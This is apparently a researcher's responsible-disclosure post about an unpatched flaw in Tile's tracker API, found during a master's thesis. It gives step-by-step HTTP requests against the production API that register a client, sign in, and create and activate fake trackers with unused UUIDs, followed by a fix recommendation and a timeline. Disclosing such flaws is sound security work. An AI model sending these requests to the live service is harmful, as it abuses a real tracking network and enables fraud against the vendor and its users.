---
title: 'Tile - Creating Fake Trackers'
publishedAt: '2024-07-05'
description: "Tile, a company selling Bluetooth-based location trackers, has a vulnerability that allows an authenticated attacker to create fake trackers. I uncovered this vulnerability during my master's thesis, in which I analyzed the security and privacy of the Tile ecosystem."
tags:
  - security
---

In my master's thesis, I analyzed the security and privacy of large portions of Tile's ecosystem.
During this, I discovered several security vulnerabilities affecting various components and features.
I reported these vulnerabilities to Tile, following [Google Project Zero's responsible disclosure policy](https://googleprojectzero.blogspot.com/2021/04/policy-and-disclosure-2021-edition.html).
However, as the 90-day deadline is over and Tile has failed to respond or patch the issues, I'm publishing my findings in hopes of raising awareness.
This post describes one vulnerability that allows any authenticated adversary to create fake trackers.

# Vulnerability

It is possible to create fake trackers with unused Tile UUIDs.

The endpoint used to add a Tile tracker to an account doesn't prohibit creating a tracker with an unused Tile UUID.

Essentially, this allows attackers to create almost as many fake trackers as they want without buying legitimate Tile trackers.
All fake trackers are treated by the Tile network as genuine trackers.

# Proof-of-Concept

The process is relatively simple.
The attacker must first sign in to their account.
Then, they must send one request to register a fake tracker and another request to actually activate the tracker.
If the attacker doesn't activate the tracker, some features, such as _Community Find_, will not work with that tracker.

## 1. Authentication

To create a fake tracker, the attacker needs a valid client UUID and use it to sign in to their account.
The attacker can create a valid client UUID by generating a random UUID and registering it with Tile by sending the following request:

```http
PUT https://production.tile-api.com/api/v1/clients/c7394030-5b88-44a2-b1be-704b730b07c7 HTTP/2.0
tile_client_uuid: c7394030-5b88-44a2-b1be-704b730b07c7
[...]: [...]


registration_timestamp=1720090702959&app_id=android-tile-production&app_version=2.115.0.5050
```

Afterwards, they can sign in to their account with the following request:

```http
POST https://production.tile-api.com/api/v1/clients/c7394030-5b88-44a2-b1be-704b730b07c7/sessions HTTP/2.0
tile_client_uuid: c7394030-5b88-44a2-b1be-704b730b07c7
[...]: [...]

email=********&password=********
```

## 2. Creating a Fake Tracker

Using the session cookie and the client UUID of the authentication, the attacker can then create fake tracker by sending the following request:

```http
POST https://production.tile-api.com/api/v1/tiles/75edcdf5bdcae9d3 HTTP/2.0
content-type: multipart/form-data; boundary=30f4a406-0a01-495b-8018-b9f087e6226e
tile_client_uuid: c7394030-5b88-44a2-b1be-704b730b07c7
cookie: session=[...]
[...]: [...]

--30f4a406-0a01-495b-8018-b9f087e6226e
Content-Disposition: form-data; name="tile_uuid"
Content-Transfer-Encoding: binary
Content-Type: text/plain; charset=UTF-8
Content-Length: 16

75edcdf5bdcae9d3
--30f4a406-0a01-495b-8018-b9f087e6226e
Content-Disposition: form-data; name="name"
Content-Transfer-Encoding: binary
Content-Type: text/plain; charset=UTF-8
Content-Length: 12

Fake Tracker
--30f4a406-0a01-495b-8018-b9f087e6226e--
```

The field Tile UUID specified in the request can be any random 8-byte value that is not yet linked to any actual Tile tracker.

## 3. Activating the Fake Tracker

In the last step, the attacker must activate the fake tracker by sending the following request:

```http
PUT https://production.tile-api.com/api/v1/tiles/75edcdf5bdcae9d3 HTTP/2.0
content-type: multipart/form-data; boundary=f0845924-3003-45d8-9aa0-816cc3870b89
tile_client_uuid: c7394030-5b88-44a2-b1be-704b730b07c7
cookie: session=[...]
[...]: [...]

--f0845924-3003-45d8-9aa0-816cc3870b89
Content-Disposition: form-data; name="status"
Content-Transfer-Encoding: binary
Content-Type: text/plain; charset=UTF-8
Content-Length: 9

ACTIVATED
--f0845924-3003-45d8-9aa0-816cc3870b89
Content-Disposition: form-data; name="group_id"
Content-Transfer-Encoding: binary
Content-Type: text/plain; charset=UTF-8
Content-Length: 36

[...]
--f0845924-3003-45d8-9aa0-816cc3870b89--
```

# Fix

It is recommended to verify that the Tile UUID is linked to a Tile tracker.

# Timeline

- 2024-03-13: Contacted Life 360's security contact through responsibledisclosure@life360.com
- 2024-05-21: Contacted Tile's support asking for a status update
